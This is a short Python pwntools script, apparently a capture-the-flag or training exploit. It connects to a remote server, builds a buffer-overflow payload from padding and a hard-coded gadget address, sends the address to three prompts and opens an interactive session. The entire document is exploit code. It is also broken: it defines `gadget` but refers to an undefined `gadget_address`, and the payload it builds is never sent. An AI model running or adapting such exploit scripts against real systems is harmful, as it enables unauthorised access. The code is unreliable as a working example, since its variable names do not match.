from pwn import *

p = remote("srv1.kitriwhs.kr", 20445)

gadget = 0x55555555526e

payload = b"A" * 0xb0 + p64(gadget_address)

p.sendline(b"a")

p.sendlineafter("1: ", p64(gadget_address))
p.sendlineafter("2: ", p64(gadget_address))
p.sendlineafter("3: ", p64(gadget_address))

p.interactive()

